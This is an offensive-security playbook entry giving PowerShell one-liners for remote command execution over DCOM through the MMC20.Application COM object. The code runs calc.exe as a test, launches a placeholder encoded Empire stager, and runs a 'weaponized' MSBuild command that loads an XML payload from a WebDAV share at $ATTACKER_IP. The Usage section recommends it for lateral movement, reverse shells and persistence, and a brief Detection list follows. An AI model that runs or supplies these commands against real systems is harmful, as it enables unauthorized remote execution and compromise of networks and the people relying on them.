---
id: 36f205fa-a844-4cc8-ba1b-b0b4333a34a9
name: powershell-dcom-shell-execution-via-mmc-application
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:07.097596+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - dcom
  - remote-execution
  - powershell
  - mmc
validated: true
---

# powershell-dcom-shell-execution-via-mmc-application

## Code

```powershell
PS C:\> $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","$TARGET_IP"))
PS C:\> $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe",$null,$null,7)
PS C:\> $com.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",$null,"-enc DFDFSFSFSFSFSFSFSDFSFSF < Empire encoded string > ","7")

# Weaponized example with MSBuild
PS C:\> [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","$TARGET_IP")).Document.ActiveView.ExecuteShellCommand("c:\windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",$null,"\\$ATTACKER_IP\webdav\build.xml","7")
```

## Description

This PowerShell code snippet demonstrates remote shell command execution via the MMC20.Application COM object over DCOM. It first creates a remote instance, then executes sample commands like launching calc.exe, running an encoded PowerShell payload (e.g., for Empire stagers), and a weaponized MSBuild invocation to load a remote XML payload. The code preserves system privileges and hides windows for stealth.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $TARGET_IP | IP address of the remote target machine | 10.10.10.1 |
| < Empire encoded string > | Base64-encoded PowerShell payload (e.g., from Empire) | Base64 string for stager |
| $ATTACKER_IP | IP address of the attacker's share (for WebDAV) | 10.10.10.2 |

## Usage

Run this in a PowerShell session with admin credentials for the target domain. Use for lateral movement after initial access, such as delivering reverse shells or persistence mechanisms. Start with the calc.exe test to validate, then escalate to payloads. Requires DCOM enabled on target.

## Detection

- Monitor PowerShell ScriptBlock logging for MMC20.Application or ExecuteShellCommand invocations.
- Sysmon Event ID 1 for process creation from mmc.exe or MSBuild.exe with unusual parents.
- Network logs for DCOM/RPC traffic (port 135) to unexpected hosts.
- ETW traces for COM object instantiations.

## Related

- [[procedures/DCOM-Shell-Command-Execution-via-MMC-Application-Class]]
